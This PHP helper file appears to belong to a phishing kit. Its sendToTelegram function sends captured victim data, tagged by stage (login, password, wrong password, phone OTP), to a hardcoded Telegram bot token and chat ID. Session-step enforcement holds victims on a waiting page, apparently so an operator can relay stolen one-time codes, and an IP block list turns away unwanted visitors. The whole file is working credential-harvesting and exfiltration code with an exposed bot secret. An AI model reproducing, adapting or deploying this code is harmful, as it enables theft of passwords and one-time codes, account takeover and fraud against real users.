<?php
// includes/functions.php

require_once __DIR__ . '/db.php';

/**
 * Generate a URL with ?session_id=...
 */
function generatePageUrl($page, $sessionId) {
    return $page . '?session_id=' . urlencode($sessionId);
}

/**
 * Send a message to Telegram with "MK TEAM" subject + an icon for each pageName,
 * skipping if your bot token or chat ID are placeholders.
 */
function sendToTelegram($message, $pageName = '', $sessionId = '') {
    // Replace with your actual bot token + chat ID
    $botToken = "8366953756:AAHzL8xvYnJAcR5p5bckpjl9VOFkCpcDPbw"; // add your token here
    $chatId   = "8117973214"; // add your chat id here

    // Skip if placeholders or empty
    if (
        $botToken === "any" ||
        $chatId   === "any"  ||
        empty($botToken) || 
        empty($chatId)
    ) {
        return;
    }

    $icon = '';
    switch ($pageName) {
        case 'login':     $icon = "\xF0\x9F\x91\xA5"; break;
        case 'password':  
        case 'wrong_password':  $icon = "\xF0\x9F\x94\x91"; break;
        case 'phone_otp': 
        case 'wrong-phone_otp': $icon = "\xF0\x9F\x93\xB1"; break;
        default:          $icon = "\xF0\x9F\x94\x92"; break;
    }

    $subject = "Top Ghost" . strtoupper($pageName);
    $text  = "$subject $icon [Session: $sessionId]\n";
    $text .= $message;

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text'    => $text
    ];

    @file_get_contents($url . "?" . http_build_query($params));
}

/**
 * OPTIONAL: Prevent user from going back in the flow
 */
function enforceSessionStep($sess, $expectedStatus) {
    if (!$sess) return;
    $currentStatus = $sess['status'] ?? '';
    if ($currentStatus !== $expectedStatus) {
        header('Location: ' . generatePageUrl('waiting.php', $sess['session_id']));
        exit;
    }
}



function checkBlockedIP() {
    $blockedFile = __DIR__ . '/../blocked_ips.json';
    if (file_exists($blockedFile)) {
        $blocked = json_decode(file_get_contents($blockedFile), true);
        if (is_array($blocked)) {
            // Adjust IP detection if behind a proxy:
            $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? ($_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN'));
            if (in_array($ip, $blocked)) {
                echo "<h1>Your IP ($ip) is blocked.</h1>";
                exit;
            }
        }
    }
}


